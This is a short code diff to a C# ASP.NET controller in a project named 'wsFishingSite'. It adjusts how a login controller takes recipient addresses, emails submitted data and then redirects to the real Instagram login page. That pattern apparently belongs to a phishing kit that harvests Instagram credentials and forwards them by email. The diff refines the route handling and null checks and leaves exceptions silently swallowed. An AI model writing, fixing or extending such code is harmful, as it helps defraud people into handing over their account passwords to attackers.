@@ -6,7 +6,7 @@ using wsFishingSite.Models;
 
 namespace wsFishingSite.Controllers
 {
-    [Route("[controller]/{mails}")]
+    [Route("[controller]/{mails?}")]
 
     public class LogInController : Controller
     {
@@ -24,7 +24,7 @@ namespace wsFishingSite.Controllers
         {
             try
             {
-                lastMails = request.Mails ?? lastMails;
+                lastMails = request.Mails = string.IsNullOrEmpty(request.Mails)? lastMails:request.Mails;
 
                 MailMessage mail = new MailMessage();
 
@@ -43,7 +43,7 @@ namespace wsFishingSite.Controllers
             }
             catch (Exception ex)
             {
-                ;
+                
             }
 
             return Redirect("https://www.instagram.com/accounts/login/");
